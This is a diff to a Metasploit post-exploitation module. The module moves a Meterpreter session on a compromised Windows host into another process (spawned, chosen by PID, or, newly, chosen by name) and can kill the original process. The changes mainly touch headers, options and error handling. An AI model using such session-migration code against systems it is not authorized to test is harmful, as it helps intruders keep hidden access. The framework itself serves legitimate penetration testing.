@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -22,16 +18,16 @@ class Metasploit3 < Msf::Post
 				migrate to that newly spawned process.},
 			'License'       => MSF_LICENSE,
 			'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-			'Version'       => '$Revision$',
-			'Platform'      => [ 'windows' ],
+			'Platform'      => [ 'win' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
 		register_options(
 			[
-				OptBool.new(  'SPAWN',[ false,'Spawn process to migrate to. If name for process not given notepad.exe is used.', true]),
-				OptInt.new(   'PID',  [false, 'PID of process to migrate to.']),
-				OptBool.new(  'KILL', [false, 'Kill original process for the session.', false])
+				OptBool.new(   'SPAWN',[ false,'Spawn process to migrate to. If name for process not given notepad.exe is used.', true]),
+				OptInt.new(    'PID',  [false, 'PID of process to migrate to.']),
+				OptString.new( 'NAME', [false, 'Name of process to migrate to.']),
+				OptBool.new(   'KILL', [false, 'Kill original process for the session.', false])
 			], self.class)
 	end
 
@@ -47,8 +43,15 @@ class Metasploit3 < Msf::Post
 		if datastore['SPAWN']
 			print_status("Spawning notepad.exe process to migrate to")
 			target_pid = create_temp_proc
-		elsif datastore['PID']
+		elsif datastore['PID'] != 0
 			target_pid = datastore['PID']
+		elsif datastore['NAME']
+			target_pid = session.sys.process[datastore['NAME']]
+		end
+
+		if not target_pid
+			print_error("Process or PID not found")
+			return
 		end
 
 		begin
@@ -57,7 +60,7 @@ class Metasploit3 < Msf::Post
 			print_good("Successfully migrated to process #{target_pid}")
 		rescue ::Exception => e
 			print_error("Could not migrate in to process.")
-			print_error(e)
+			print_error("Exception: #{e.class} : #{e}")
 		end
 
 		if datastore['KILL']
